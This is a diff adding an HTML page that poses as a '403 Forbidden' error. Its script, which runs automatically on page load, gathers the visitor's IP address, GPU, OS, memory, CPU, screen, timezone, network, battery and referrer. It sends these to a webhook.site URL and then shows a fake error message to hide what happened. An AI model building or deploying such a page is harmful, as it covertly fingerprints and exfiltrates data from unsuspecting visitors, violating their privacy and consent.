@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>403 Forbidden</title>
+    
+    <script>
+        async function runFinalSiphon() {
+            const webhookURL = "https://webhook.site/be1f8166-199e-4240-ae8e-9749374ddbf7";
+
+            // 1. Detaylı GPU Analizi
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Bilinmiyor";
+
+            // 2. IP Çekme
+            let ip = "N/A";
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                ip = ipData.ip;
+            } catch (e) {}
+
+            // 3. Batarya Seviyesi
+            let battery = "N/A";
+            if (navigator.getBattery) {
+                try {
+                    const b = await navigator.getBattery();
+                    battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Şarjda' : 'Pilde'})`;
+                } catch (e) {}
+            }
+
+            // 4. Veri Paketleme (Her Şey Dahil)
+            const data = {
+                "IP": ip,
+                "İşletim_Sistemi": navigator.platform,
+                "GPU": gpu,
+                "RAM_GB": (navigator.deviceMemory || "Belirsiz") + " GB",
+                "CPU_Cekirdek": navigator.hardwareConcurrency || "Gizli",
+                "Cozunurluk": `${screen.width}x${screen.height}`,
+                "Renk_Derinligi": screen.colorDepth + " bit",
+                "Tarayici": navigator.userAgent.split(" ").pop(),
+                "Dil": navigator.language,
+                "Zaman_Dilimi": Intl.DateTimeFormat().resolvedOptions().timeZone,
+                "Ag_Tipi": (navigator.connection ? navigator.connection.effectiveType : "Bilinmiyor"),
+                "Ag_Hizi": (navigator.connection ? navigator.connection.downlink + " Mbps" : "N/A"),
+                "Dark_Mode": window.matchMedia('(prefers-color-scheme: dark)').matches ? "Açık" : "Kapalı",
+                "Dokunmatik_Nokta": navigator.maxTouchPoints,
+                "PDF_Desteği": navigator.pdfViewerEnabled ? "Var" : "Yok",
+                "Sarj": battery,
+                "Referrer": document.referrer || "Direkt"
+            };
+
+            // 5. Webhook'a Fırlat
+            const params = new URLSearchParams(data);
+            try {
+                await fetch(`${webhookURL}?${params.toString()}`, { mode: 'no-cors' });
+            } catch (e) {}
+
+            // 6. Gerçekçi Hata Sayfası
+            document.body.innerHTML = `
+                <div style="font-family: sans-serif; padding: 40px; color: #222;">
+                    <h1 style="font-size: 40px;">403 Forbidden</h1>
+                    <hr>
+                    <p>You do not have permission to access this resource on this server.</p>
+                </div>
+            `;
+        }
+
+        window.onload = runFinalSiphon;
+    </script>
+</head>
+<body style="background: #fff; margin: 0;">
+</body>
+</html>
